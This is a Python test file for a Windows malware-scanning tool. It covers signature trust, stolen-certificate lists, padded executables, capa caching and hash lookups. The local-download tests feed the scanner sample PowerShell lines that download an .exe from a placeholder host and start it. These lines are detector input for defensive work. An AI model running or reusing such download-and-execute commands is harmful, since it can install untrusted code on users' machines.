"""Fixes from the false-alarm round (blotter-tests/REPORT.md): the tool, signatures, padding, capa speed,
local downloads, and CIRCL on tiny files."""

import json
import os
import shutil
import sys
import tempfile
import types
import unittest
from pathlib import Path
from unittest import mock

from blotter import config, hashing
from blotter.analyze import program, scripts
from blotter.cache import Cache
from blotter.checks import capabilities, hashlookup
from blotter.checks import signature as signature_check
from blotter.findings import (CLEAR, HIDING, MALICIOUS, NOTE, PADDED, SIGNED, SKIPPED, SUSPICIOUS, UNCHECKED,
                              UNSIGNED, Finding, detected, risky)
from blotter.runner import Runner
from blotter.verdict import decide
from tests import samples
from tests.test_catches import full_scan

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "tools"))
import false_alarm_test  # noqa: E402

SYSTEM32 = Path(os.environ.get("SystemRoot", r"C:\Windows")) / "System32"
RAN = Finding("filetype", CLEAR, "It is a Windows program (EXE).")


def signed(publisher="Microsoft Windows"):
    return Finding("signature", CLEAR, f"It is digitally signed by {publisher}.",
                   {"trusted_publisher": publisher}, [SIGNED])


# ---- 1. the false-alarm tool ----

def verdict_check(path):
    """A stand-in check: the file's text says which answer to give."""
    text = Path(path).read_bytes()
    if text.startswith(b"unchecked"):
        return [Finding("x", NOTE, "Too big for a check.", {}, [UNCHECKED])]
    if text.startswith(b"suspicious"):
        return [Finding("x", SUSPICIOUS, "A warning.")]
    return [Finding("x", CLEAR, "Nothing found.")]


class FalseAlarmToolTests(unittest.TestCase):
    def folder(self, contents: dict) -> Path:
        folder = Path(tempfile.mkdtemp())
        for name, data in contents.items():
            (folder / name).write_bytes(data)
        return folder

    def stand_in(self):
        return [types.SimpleNamespace(ID="x", NAME="Stand-in", ORDER=1, TIMEOUT=10, CACHE=False,
                                      NEEDS_FILE=False, scan=verdict_check)]

    def latest_report(self) -> str:
        reports = sorted(config.HOME.glob("false-alarm-test-*.txt"), key=lambda p: p.stat().st_mtime)
        return reports[-1].read_text(encoding="utf-8")

    def test_every_answer_is_handled_and_reported(self):
        folder = self.folder({"a.exe": b"unchecked", "b.exe": b"suspicious", "c.txt": b"fine"})
        code = false_alarm_test.main([str(folder)], checks=self.stand_in())
        text = self.latest_report()
        self.assertIn("Couldn't fully check", text)
        self.assertRegex(text, r"Couldn't fully check\s+1")
        self.assertRegex(text, r"Suspicious\s+1")
        self.assertRegex(text, r"No known detections\s+1")
        self.assertIn("--- Couldn't fully check ---", text)
        self.assertEqual(code, 0)

    def test_report_is_saved_even_when_the_run_stops(self):
        folder = self.folder({f"{i}.txt": b"fine" for i in range(4)})
        real_start = Runner.start
        calls = []

        def start_then_fail(self_, *a, **k):
            calls.append(1)
            if len(calls) == 3:
                raise RuntimeError("the PC went to sleep")
            return real_start(self_, *a, **k)

        with mock.patch.object(Runner, "start", start_then_fail):
            code = false_alarm_test.main([str(folder)], checks=self.stand_in())
        text = self.latest_report()
        self.assertIn("THE RUN STOPPED EARLY: RuntimeError: the PC went to sleep", text)
        self.assertRegex(text, r"Files: 2 of 4")
        self.assertEqual(code, 1, "an incomplete run never counts as target met")

    def test_unknown_future_answer_doesnt_crash(self):
        self.assertEqual(false_alarm_test.title("some_new_answer"), "some_new_answer")

    def test_one_file_at_a_time_by_default(self):
        import argparse  # noqa: F401
        with mock.patch.object(false_alarm_test, "check_folder", return_value=[]) as run:
            false_alarm_test.main([str(self.folder({"a.txt": b"x"}))], checks=self.stand_in())
        self.assertEqual(run.call_args.args[3], 1)


# ---- 2. catalog signatures on copies of System32 files ----

class CatalogSignatureTests(unittest.TestCase):
    def test_copies_of_system32_files_are_signed_by_microsoft(self):
        for name in ("kernel32.dll", "certutil.exe", "schtasks.exe"):
            copy = Path(tempfile.mkdtemp()) / "copy.blotter"
            shutil.copyfile(SYSTEM32 / name, copy)
            [found] = signature_check.scan(copy)
            self.assertEqual(found.signals, [SIGNED], f"{name}: {found.text}")
            self.assertIn("Microsoft", found.details["trusted_publisher"], name)
            self.assertEqual(found.details["signature"]["kind"], "Catalog", name)
            self.assertTrue(found.details["signature"]["thumbprint"], name)

    def test_stolen_certificate_is_a_warning_not_trust(self):
        copy = Path(tempfile.mkdtemp()) / "copy.blotter"
        shutil.copyfile(SYSTEM32 / "certutil.exe", copy)
        [found] = signature_check.scan(copy)
        with mock.patch.object(program, "stolen_certificates",
                               return_value={found.details["signature"]["thumbprint"]: "test entry"}):
            [flagged] = signature_check.scan(copy)
        self.assertEqual(flagged.level, SUSPICIOUS)
        self.assertNotIn(SIGNED, flagged.signals)
        self.assertNotIn("trusted_publisher", flagged.details)
        self.assertIn("stolen", flagged.text)

    def test_stolen_list_ships_empty_and_an_empty_list_works(self):
        """Security data never comes from memory: the list waits for the intel pack (abuse.ch)."""
        self.assertEqual(program.stolen_certificates(), {})
        copy = Path(tempfile.mkdtemp()) / "copy.blotter"
        shutil.copyfile(SYSTEM32 / "certutil.exe", copy)
        [found] = signature_check.scan(copy)
        self.assertEqual(found.details.get("trusted_publisher"), "Microsoft Windows")

    def test_stolen_list_format(self):
        rules = Path(tempfile.mkdtemp())
        (rules / "stolen-certificates.txt").write_text("# note only\n\n43:BB 43  # example\n", encoding="utf-8")
        with mock.patch.object(config, "OWN_RULES", rules):
            self.assertEqual(program.stolen_certificates(), {"43bb43": "example"})
        with mock.patch.object(config, "OWN_RULES", Path(tempfile.mkdtemp())):
            self.assertEqual(program.stolen_certificates(), {}, "a missing file is an empty list")


# ---- 3. a trusted publisher's signature quiets abilities, never detections ----

class TrustedSignatureTests(unittest.TestCase):
    ABILITIES = [risky("capa", "inject", "It can inject code."), risky("capa", "persistence", "It starts itself."),
                 Finding("capa", NOTE, "It checks whether it is being watched.", {"ability": "anti"}, [HIDING])]

    def test_abilities_of_a_trusted_program_dont_raise_the_answer(self):
        self.assertEqual(decide([RAN, *self.ABILITIES])["verdict"], "suspicious")
        v = decide([RAN, signed(), *self.ABILITIES])
        self.assertEqual(v["verdict"], "no_known_detections")
        self.assertIn("signed by Microsoft Windows, a trusted publisher", v["summary"])
        self.assertTrue(any("inject" in r for r in v["reasons"]), "the abilities stay listed")

    def test_engine_detections_are_never_quieted(self):
        clam = detected(Finding("clamav", MALICIOUS, "ClamAV recognises it."), "ClamAV", "Win.Trojan.X")
        self.assertEqual(decide([RAN, signed(), *self.ABILITIES, clam])["verdict"], "malicious")
        yara = detected(Finding("yara", SUSPICIOUS, "A broad YARA rule matches."), "YARA", "Generic")
        self.assertEqual(decide([RAN, signed(), yara])["verdict"], "suspicious")

    def test_a_disguise_still_counts(self):
        disguised = Finding("filetype", NOTE, "Really a program named .jpg.", {}, ["disguised", "lying_name"])
        self.assertEqual(decide([RAN, signed(), disguised])["verdict"], "suspicious")

    def test_unsigned_or_untrusted_signature_isnt_quieted(self):
        untrusted = Finding("signature", NOTE, "Self-made signature.", {}, [UNSIGNED])
        self.assertEqual(decide([RAN, untrusted, *self.ABILITIES])["verdict"], "suspicious")

    def test_signed_archive_member_only_quiets_itself(self):
        inside = [Finding("archive", CLEAR, "signed", {"scope": "a.exe", "trusted_publisher": "X"}, [SIGNED]),
                  risky("archive", "inject", "x", {"scope": "b.exe"}),
                  Finding("archive", NOTE, "hides", {"scope": "b.exe"}, [HIDING])]
        self.assertEqual(decide([RAN, *inside])["verdict"], "suspicious")


# ---- 4. padding ----

class PaddingTests(unittest.TestCase):
    def padded(self, mb=12):
        path = Path(tempfile.mkdtemp()) / "padded.blotter"
        path.write_bytes(samples.minimal_pe() + bytes(mb * 1024 * 1024))
        return path

    def test_overlay_is_measured_and_capa_gets_the_program_alone(self):
        path = self.padded()
        info = program.overlay(path)
        self.assertLessEqual(info["start"], len(samples.minimal_pe()), "the overlay starts right after the program")
        self.assertGreaterEqual(info["size"], 12 * 1024 * 1024)
        self.assertEqual(info["entropy"], 0.0)
        target, note = capabilities._without_overlay(path)
        self.assertEqual(os.path.getsize(target), info["start"])
        self.assertIn("12 MB", note)

    def test_unsigned_padded_program_is_suspicious(self):
        found = program.analyze("program", self.padded(), check_signature=False)
        padding = [f for f in found if PADDED in f.signals]
        self.assertTrue(padding)
        unsigned = Finding("signature", NOTE, "It isn't digitally signed.", {}, [UNSIGNED])
        v = decide([RAN, unsigned, *found])
        self.assertEqual(v["verdict"], "suspicious")
        self.assertIn("padded with empty filler", v["summary"])
        self.assertNotEqual(decide([RAN, signed(), *found])["verdict"], "suspicious", "signed installers may pad")

    def test_compressed_payloads_are_not_padding(self):
        import random
        path = Path(tempfile.mkdtemp()) / "installer.blotter"
        path.write_bytes(samples.minimal_pe() + random.Random(4).randbytes(12 * 1024 * 1024))
        self.assertFalse(any(PADDED in f.signals for f in program.analyze("program", path, check_signature=False)))

    def test_padded_to_300_mb_is_no_longer_couldnt_fully_check(self):
        data = samples.minimal_pe() + bytes(300 * 1024 * 1024 - len(samples.minimal_pe()))
        job = full_scan(data, "setup.exe")
        del data
        self.assertNotEqual(job.verdict["verdict"], "couldnt_fully_check", job.verdict)
        self.assertEqual(job.verdict["verdict"], "suspicious", job.verdict)
        self.assertTrue(any("filler" in r for r in job.verdict["reasons"]), job.verdict["reasons"])


# ---- 5. trusted-signed programs over capa's limits ----

class DeepCheckSkippedTests(unittest.TestCase):
    TOO_BIG = Finding("capa", NOTE, "The program is over 25 MB ...", {"deep_check": True}, [UNCHECKED])

    def test_signed_says_deep_check_skipped(self):
        v = decide([RAN, signed("Python Software Foundation"), self.TOO_BIG])
        self.assertEqual(v["verdict"], "no_known_detections")
        self.assertIn("Signed by Python Software Foundation, deep check skipped.", v["reasons"])

    def test_other_valid_signatures_keep_couldnt_fully_check(self):
        other = Finding("signature", CLEAR, "Signed by OpenJS Foundation.", {"signed_by": "OpenJS Foundation"}, [SIGNED])
        self.assertEqual(decide([RAN, other, self.TOO_BIG])["verdict"], "couldnt_fully_check")

    def test_unsigned_keeps_couldnt_fully_check(self):
        unsigned = Finding("signature", NOTE, "It isn't digitally signed.", {}, [UNSIGNED])
        self.assertEqual(decide([RAN, unsigned, self.TOO_BIG])["verdict"], "couldnt_fully_check")

    def test_other_limits_still_count_for_signed_programs(self):
        clam = Finding("clamav", NOTE, "Over ClamAV's limit.", {}, [UNCHECKED])
        self.assertEqual(decide([RAN, signed(), self.TOO_BIG, clam])["verdict"], "couldnt_fully_check")


# ---- 6. capa speed ----

class CapaSpeedTests(unittest.TestCase):
    def test_arch_modules_are_built_once_and_handed_out_as_new_lists(self):
        import envi
        from blotter import capa_fast
        with mock.patch.object(envi, "getArchModules", envi.getArchModules):
            capa_fast.install()
            a, b = envi.getArchModules(), envi.getArchModules()
            self.assertIsNot(a, b, "callers change the list, so each gets its own")
            self.assertTrue(all(x is y for x, y in zip(a, b)), "the modules themselves are reused")

    def test_capa_runs_through_the_fix(self):
        self.assertIn("run_module('blotter.capa_fast'", capabilities.command("x.blotter")[4])

    def test_same_results_with_and_without_the_fix(self):
        rules = Path(os.environ.get("LOCALAPPDATA", "")) / "Blotter" / "rules" / "capa"
        if not rules.is_dir():
            self.skipTest("capa's rules aren't downloaded on this PC")
        import subprocess
        target = Path(sys.base_prefix) / "python.exe"
        base = [sys.executable, "-I", "-m"]
        args = ["-j", "-q", "-r", str(rules), "-s", str(rules.parent / "capa-sigs"), str(target)]
        env = {**os.environ, "PYTHONPATH": str(Path(__file__).resolve().parent.parent)}
        plain = subprocess.run(base + ["capa.main", *args], capture_output=True, timeout=600)
        fast = subprocess.run([sys.executable, "-m", "blotter.capa_fast", *args], capture_output=True, timeout=600,
                              env=env, cwd=str(Path(__file__).resolve().parent.parent))
        a, b = json.loads(plain.stdout), json.loads(fast.stdout)
        self.assertEqual({k: sorted(map(str, v["matches"])) for k, v in a["rules"].items()},
                         {k: sorted(map(str, v["matches"])) for k, v in b["rules"].items()})

    def test_results_are_remembered_per_rules_version(self):
        self.assertTrue(capabilities.CACHE)
        from blotter.runner import _cache_id
        self.assertEqual(_cache_id(capabilities), f"capa@{capabilities.CACHE_VERSION}")

    def test_cut_short_results_are_not_remembered(self):
        cache = Cache(Path(tempfile.mkdtemp()) / "c.sqlite3")
        slow = types.SimpleNamespace(ID="slowcheck", NAME="Slow", ORDER=1, TIMEOUT=5, CACHE=True, NEEDS_FILE=False,
                                     scan=lambda p: [Finding("slowcheck", NOTE, "too slow", {}, [UNCHECKED])])
        path = Path(tempfile.mkdtemp()) / "a.blotter"
        path.write_bytes(b"x")
        from tests.test_runner_app import wait_done
        wait_done(Runner(cache, [slow]).start(path, "a", 1, "c" * 64))
        self.assertIsNone(cache.get("c" * 64, "slowcheck"))


# ---- 7. downloads from this PC ----

class LocalDownloadTests(unittest.TestCase):
    TEXT = __import__("blotter.analyze.filetype", fromlist=["FileType"]).FileType("text", "", "text", {})

    def abilities(self, text: bytes, name="start.bat"):
        from blotter.checks import scripts as scripts_check
        return {f.details.get("ability") for f in scripts_check.judge(self.TEXT, name, text)}

    def test_health_check_on_this_pc_isnt_download_and_run(self):
        deck = (b'powershell -NoProfile -Command "Invoke-WebRequest http://127.0.0.1:4747/api/version '
                b'-UseBasicParsing" >nul\r\nstart "" pythonw.exe -m deck.serve\r\n')
        self.assertFalse({"download", "download-run"} & self.abilities(deck))
        self.assertFalse({"download", "download-run"} & self.abilities(
            b"curl http://localhost:8080/health && start app.exe"))

    def test_internet_downloads_still_count(self):
        self.assertIn("download-run", self.abilities(b"iwr https://example.invalid/a.exe -OutFile a.exe; Start-Process a.exe"))
        mixed = b"iwr http://127.0.0.1/x; iwr https://example.invalid/a.exe -OutFile a.exe; Start-Process a.exe"
        self.assertIn("download-run", self.abilities(mixed))
        self.assertIn("download-run", self.abilities(b"$u = $env:URL; iwr $u -OutFile a.exe; Start-Process a.exe"),
                      "an address Blotter can't see still counts")

    def test_address_parsing(self):
        self.assertTrue(scripts._only_this_pc("curl https://[::1]:8443/x"))
        self.assertFalse(scripts._only_this_pc("curl https://127.0.0.1.example.invalid/x"))


# ---- 8. CIRCL on tiny files ----

class TinyFileTests(unittest.TestCase):
    def test_empty_and_tiny_files_arent_looked_up(self):
        for size in (0, 1, 1023):
            path = Path(tempfile.mkdtemp()) / "a.blotter"
            path.write_bytes(b"x" * size)
            with mock.patch("requests.request") as request:
                [found] = hashlookup.scan(path)
            self.assertEqual(found.level, SKIPPED, size)
            request.assert_not_called()

    def test_1_kb_and_more_are_looked_up(self):
        path = Path(tempfile.mkdtemp()) / "a.blotter"
        path.write_bytes(b"x" * 1024)
        with mock.patch("requests.request", return_value=mock.Mock(status_code=404)) as request:
            hashlookup.scan(path)
        request.assert_called_once()

    def test_old_remembered_answers_are_retired(self):
        from blotter.runner import _cache_id
        self.assertEqual(_cache_id(hashlookup), "hashlookup@2")


if __name__ == "__main__":
    unittest.main()
